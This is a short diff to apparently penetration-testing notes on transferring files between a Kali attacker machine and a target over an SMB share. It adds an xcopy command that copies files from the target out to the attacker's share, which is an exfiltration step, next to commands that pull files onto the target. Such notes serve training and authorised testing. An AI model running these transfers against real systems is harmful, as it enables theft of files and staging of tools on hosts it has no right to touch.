@@ -15,10 +15,17 @@ net use
 copy \\<Kali IP>\share\<file> .
 dir
 ```
-or
+
+KALI to TARGET
 ```
 xcopy \\<Kali IP>\share\<file> C:\<destination_path>\
 ```
+
+TARGET to KALI
+```
+xcopy <source_path>\<file> \\<Kali IP>\share\
+```
+
 
 ## HTTP - from Kali to target
 
